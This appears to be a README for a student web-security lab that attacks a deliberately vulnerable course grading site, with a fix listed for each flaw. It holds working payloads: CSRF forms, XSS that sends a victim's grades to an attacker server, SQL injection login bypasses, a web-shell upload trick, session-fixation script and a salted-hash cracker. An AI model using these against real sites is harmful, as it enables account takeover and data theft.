* Summary
This is the readme file for FLAG.

* Dependency
Running the attack requires python installed with the following
packages:

- torando
- cmd2
- bs4

All of them can be easily installed through pip.

* How to run the attacks
First, open the shell by 

#+BEGIN_SRC bash
python shell.py
#+END_SRC

Then, login as the victim by typing

#+BEGIN_SRC 
>>> victim <victim_name>
#+END_SRC

which will open up firefox, and you may login as the victim (Please
login as the victim_name as you input, otherwise things might not work).

All the attacks will work against the logged in victim.

* Distinct Vulnerabilities 

** Cross-Site Request Forgery
To perform a csrf, I create a page in which there is an auto-submitted
form to the target url (in this case
"http://35.186.175.202/edit-profile.php"), along with parameters such
as "about_me". I also set its target to an invisible iframe in the
same page so that when victim clicks the bait link, he/she will not
notice page redirection.

To enable auto-submit, I used embedded javascript in the "onload"
attribute of "<body>":

#+BEGIN_SRC html
    <body onload="document.forms[0].submit();">
#+END_SRC

The shell command for this attack is "csrf", upon entered it will fire
up firefox with the attacker's site. Visiting the site when you have
logged in as the victim will change the victim's profile to whatever
you specified.

*** How to run the attack

#+BEGIN_SRC 
>>> csrf <profile_message>
#+END_SRC

*** How to fix
CSRF token can be an effective mitigation. 

The server should enforce that any state changing operation requires a
secure random token (e.g., CSRF token). Here's a quote from OWASP.

#+BEGIN_QUOTE
A CSRF token should be unique per user session, large random value,
and also generated by a cryptographically secure random number
generator. The CSRF token is added as a hidden field for forms
headers/parameters for AJAX calls, and within the URL if the state
changing operation occurs via a GET.
#+END_QUOTE

By requiring csrf token in every state changing operation, csrf attack
can be largely mitigated.

** Stored XSS
To perform stored XSS, I created a page which will store arbitrary
code we want to inject. In shell.py we inject the following javascript
snippet to the page "/profile.php":

#+BEGIN_SRC javascript
<script>alert('You are XSS-ed!')</script>
#+END_SRC

This will cause any visit to "/profile.php" to run the snippet and
pops up alert.

*** How to run the attack

#+BEGIN_SRC 
>>> sxss
#+END_SRC

*** How to fix it
By using output escaping/encoding properly, SXSS can be
avoided. Generally, we should escape/encode special characters in
unstructed data before inserting into the pages or storing them in
database.

Firstly, we should never allow untrusted data to be inserted to HTML.
Secondly, we should escape HTML before inserting untrusted data into
HTML element content.  Additionally, we should also escape attributes
before inserting untrusted data to HTML.  And we should also escape
javascript before inserting to javascript data values.

If we were to perform sanitazation, we should use the whitelist method
instead of the blacklist method. That is, we only allow the characters
in a whiltelist and rejects all characters outside this list.

** Cross-Site Data Access (xsda)
I used SXSS as a stepstone for xsda. First, I inject the a javascript
snippet in the comment section of the victim's profile.

#+BEGIN_SRC javascript
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {{
    console.log(xhr.response);
    var sender = new XMLHttpRequest();
    sender.open('POST', 'http://localhost:{port}/grades', true);
    sender.send(xhr.response);
}}
xhr.open('GET', '/list-grades.php', true);
xhr.send(null);
</script>
#+END_SRC

Which will initiate an XMLHttpRequest to "/grades" and fetch all the
grades of the victim. Upon receiving the html containing the grade
table, it initiate another XMLHttpRequest to send all the grades to a
local server we set up through a certain port.

Next, we visit the local server's page and we shall see the grade of
the victim.

*** How to run the attack

#+BEGIN_SRC 
>>> xsda
#+END_SRC

Note: the web server we set up is running in a thread, so feel free to
type enter and continue using the shell.

*** How to fix it

Similar to how to prevent SXSS and CSRF, we should both use csrf
tokens as well as properly escape untrusted data before inserting into
pages or storing them in database.

** SQL Injection
I discovered a SQL injection vulnerability in several places. One of
the most severe one is in the login page.

The server side does not properly escape special characters like
double quotes and dashes, allowing attackers to perform SQL injection.

Specifically, we can login as any user using the following using name

#+BEGIN_SRC 
<username>";--
#+END_SRC

where <username> is the username you want to login as. Additionally,
we can use the following to login as the first person in the users
database.

#+BEGIN_SRC 
" OR 1 = 1; --
#+END_SRC

This causes the SQL query in the server side to retrieve all the user
records. And when it wants to access the user info, it uses 

#+BEGIN_SRC php
$users[0]
#+END_SRC

which gives us the first user -- Roberto.

I should mention this later but using reverse-shell we can find the
exact code that causes this vulnerability. It's in
"/var/www/include/db.php:14:15", "/var/www/include/db.php:38", and triggered by
"/var/www/include/user.php:118:122".

#+BEGIN_SRC php
$args = array_map(array($this, 'quote'), $args);
$query = str_replace(array_keys($args), array_values($args), $query);
...
private static function quote($str)
{
    return '"' . $str . '"';
}
#+END_SRC

Here the function quote simply surround $str with two double quotes
without any sanitization whatsoever, which causes the vulnerability.

*** How to run the attack

#+BEGIN_SRC 
>>> sql_injection
#+END_SRC

This will gives us a page with a ready-to-inject form. We can click
the inject button and it will gives us the main page of Roberto.

*** How to fix it

1. Use prepared statements with parameterized queries
2. Use stored procedures
3. Whitelist input validation
4. Escape all user supplied input

** File Upload
In my own opinion, this is by far the most dangerous vulnerability. I
noticed that the server will only allow users to upload pdf
files. However, the way it checks whether it's a pdf file is
problematic.

Upon experiment, I found that it only checks whether the file
extension contains the string "pdf". However, a file can have a long
extension with several dots in between. For example, one can upload a
file "evil.pdf.php" to the server and it will be accepted. Upon next
visit, apache server detects that the actual file type is php, so it
will execute the file as a php script. This allows us to execute
arbitrary program with the same priviledge as the web server itself.

I uploaded a phpbase script as an assignment and the server accepts
it. Using it I can download all the server scripts for further
investigation which allows the last attack (i.e. bad password hashing)
possible.

Additionally, I also found that the assignment name hashing function
is predictable. By examining "user.php:144", I found that it's a sha1
hash of "$username_$assignment", where $username is the username of
the user and $assignment is one of {"cryptography", "flag", "dropbox",
"handin"}. Using this knowledge I can compute the url of the submitted
file without visiting the assignment page. This gives more freedom to
the attacker when doing testing.

*** How to run the attack

#+BEGIN_SRC 
>>> fileupload
#+END_SRC

Then, we choose "phpbash.pdf.php" and then submit. Next, we can click
the button below to visit the file and you should see the phpbash.

Note: the fileupload page will upload the file to the current
logged-in user. So if you are "Alice" the uploaded file will only be
visible if you are logged-in as "Alice" but not as someone else.

*** How to fix it

1. Use whitelist file extension validatoin
2. Validate full filename instead of only a subset
3. Use "Content-Type" header validation
4. Use a file type detector
5. Detect server-side runnable script in file (e.g. php snippet in png
   files) and reject such cases
6. Don't allow access to upload directory
7. Implement custom logic in file getter service

** Insecure Direct Object Reference
I found that almost all server-side resources can be accessed through
direct object reference in the url. For example, there's a file called
"index.tpl" which serves as the template of the main page of the
website. Normally it shouldn't be accessed. However, using the
following url we can access it:

    http://35.186.175.202/include/templates/index.tpl

I listed a few other resources that shouldn't be accessed by users but
can be accessed because of this vulnerability.

*** How to run the attack

#+BEGIN_SRC 
>>> directaccess
#+END_SRC

*** How to fix it
1. Store resources in database instead of file system
2. Whitelist url validation
3. Use single-component paths

** Session Fixation
I found that the server keeps the session when re-authenticating the
user, making it possible to use an existing session ID. The attack
consists of obtaining a valid session ID as an attacker, and then
inducing the victim to authenticate himself/herself with the session
ID. Then we hijack the user-valided session by knowing the session ID.

For this particular site, the session is stored in cookie. Therefore I
uses an SXSS to change the document.cookie property to the target
session ID.

*** How to run the attack

#+BEGIN_SRC 
>>> session_fixation <sessionIDcookie>
#+END_SRC

First we obtain the session ID in the form of "PHPSESSID=kljkasf...",
and then use the above command. The command will open an html page to
firstly inject the following SXSS script, which changes the session ID
as we desired. 

#+BEGIN_SRC javascript
<script>
setInterval(function(){{ document.cookie=&#34;{}&#34;;}}, 500);
</script>
#+END_SRC

Here "&#34;" is the html encoding of the double quote.

Then we can click the button to visit the profile page. Notice that we
are now logged in as the attacker.

*** How to fix it
1. Generate new session upon user authenticate
2. If a user submits a session ID via a different exchange mechanism,
   such as URL, server should reject it and require re-authenticate
3. Use HttpOnly attribute for cookie (disallows javascript access/modify cookie)
4. Use Secure attribute for cookie (disallows sending cookie via
   insecure HTTP connection)
5. Use proper Expire and Max-Age attribute to force re-authenticate
6. Disallow browser cross-tab session

** Bad Password Hashing
As mentioned before, the server contains a bad password hashing
vulnerability. Specifically, it uses the same salt for every
password. This allows us to perform frequency analysis since the hash
is now deterministic. Furthermore, if we know the salt, we can run
intelligent password cracking very efficiently.

I found out that the salt they use is the string
"supersecretsalt". Combining with a php script that list all the
users' password hash, and a popular password dictionary, we can
perform an intelligent password cracking.

Specifically, this is the server code for password hashing

#+BEGIN_SRC php
    /* This algorithm uses salting and stretching! It is super secure. -- Bob, Nov 15th 2012 */
    public static function hash_password($pwd)
    {
        $salt = 'supersecretsalt';
        for ($i = 0; $i < 30; ++$i)
        {
            $pwd = sha1($salt . $pwd);
        }
        return $pwd;
    }
#+END_SRC

I wrote a go program to hash every password in the rockyou.txt and see
if we can find a match.

#+BEGIN_SRC go
func hashpwd(pwd string) string {
	var pwdBytes []byte
	pwdBytes = append(pwdBytes, []byte(pwd)...)
	salt := []byte("supersecretsalt")
	for i := 0; i < 30; i++ {
		content := append(salt, pwdBytes[:]...)
		digest := sha1.Sum(content)
		pwdBytes = []byte(hex.EncodeToString(digest[:]))
	}
	
	return string(pwdBytes)
}
#+END_SRC

We sucessfully crack the password hash of all the staff's account.

*** How to run the attack

#+BEGIN_SRC 
>>> badpassword
#+END_SRC

Then upload "getpasswords.pdf.php".

Visit the link via clicking the button.

Copy the target hash.

#+BEGIN_SRC 
>>> crack <hash> <dictionary>
#+END_SRC

For example, use 
#+BEGIN_SRC 
>>> crack <hash> ./rockyou.txt
#+END_SRC

*** How to fix it
1. Use random, different salt for each user/password.
2. Enforce stricter rule on password choice (e.g. Must have 1 special
   character, 1 capital letter, 1 number)
3. Use secure hash function (e.g. SHA256), and never use outdated ones
   (SHA1 and MD5).
4. Do not develop your own crypto hash function.

